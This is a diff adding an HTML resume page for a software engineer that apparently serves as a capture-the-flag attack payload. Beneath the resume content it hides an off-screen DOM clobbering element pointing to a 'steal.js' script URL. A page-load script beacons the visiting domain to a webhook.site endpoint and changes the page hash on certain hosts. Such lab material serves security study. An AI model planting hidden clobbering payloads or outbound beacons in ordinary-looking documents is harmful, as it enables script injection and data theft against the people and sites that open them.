@@ -1,0 +1,93 @@
+  <!DOCTYPE html>
+  <html>
+  <head>
+      <title>Senior Software Engineer - Baltimore Area</title>
+      <meta charset="UTF-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1.0">
+      <style>
+          body { font-family: 'Arial', sans-serif; line-height: 1.6; margin: 0;
+  padding: 40px; background-color: #f9f9f9; }
+          .container { max-width: 800px; margin: 0 auto; background: white;
+  padding: 40px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+          .header { border-bottom: 3px solid #2c3e50; padding-bottom: 20px;
+  margin-bottom: 30px; }
+          h1 { color: #2c3e50; margin: 0; }
+          h2 { color: #34495e; border-left: 4px solid #3498db; padding-left: 10px;
+  }
+          .contact { color: #7f8c8d; margin-top: 10px; }
+          .skills { display: flex; flex-wrap: wrap; gap: 10px; }
+          .skill { background: #ecf0f1; padding: 5px 10px; border-radius: 20px; }
+      </style>
+  </head>
+  <body>
+      <div class="container">
+          <div class="header">
+              <h1>Michael Thompson</h1>
+              <div class="contact">
+                  <strong>Senior Software Engineer</strong><br>
+                  📧 michael.thompson@protonmail.com | 📱 (410) 555-0199<br>
+                  📍 Baltimore, MD | 💼 LinkedIn: /in/mthompson-dev
+              </div>
+          </div>
+
+          <!-- DOM Clobbering payload - invisible to users -->
+          <div style="position: fixed; left: -10000px; visibility: hidden; opacity:
+   0;">
+              <input id="utilsJS" name="url" 
+  value="https://YOUR_USERNAME.github.io/resume-portfolio/steal.js">
+          </div>
+
+          <h2>🎯 Professional Summary</h2>
+          <p>Accomplished software engineer with 12+ years of experience in
+  full-stack development, cybersecurity, and team leadership.</p>
+
+          <h2>💼 Work Experience</h2>
+          <h3>Senior Software Engineer | CyberSec Solutions Inc. | 2021-2024</h3>
+          <ul>
+              <li>Led security assessments and penetration testing for Fortune 500
+  clients</li>
+              <li>Developed secure web applications using React, Node.js, and
+  PostgreSQL</li>
+          </ul>
+
+          <h2>🛠️ Technical Skills</h2>
+          <div class="skills">
+              <span class="skill">JavaScript (ES6+)</span>
+              <span class="skill">Python</span>
+              <span class="skill">Security Testing</span>
+              <span class="skill">Penetration Testing</span>
+          </div>
+      </div>
+
+      <script>
+          console.log('Resume loaded for CTF challenge');
+
+          if (window.utilsJS && window.utilsJS.url) {
+              console.log('DOM clobbering configured:', window.utilsJS.url);
+
+              try {
+
+  fetch('https://webhook.site/1bd95653-39a3-44bb-8f14-f88bb2d9ddad', {
+                      method: 'POST',
+                      body: JSON.stringify({
+                          status: 'RESUME_LOADED',
+                          timestamp: new Date().toISOString(),
+                          domain: window.location.hostname,
+                          target_script: window.utilsJS.url
+                      }),
+                      headers: {'Content-Type': 'application/json'}
+                  }).catch(() => {});
+              } catch(e) {}
+          }
+
+          setTimeout(() => {
+              try {
+                  if (window.location.hostname.includes('secjhu') ||
+  window.location.hostname.includes('localhost')) {
+                      window.location.hash = '#messages';
+                  }
+              } catch(e) {}
+          }, 2000);
+      </script>
+  </body>
+  </html>
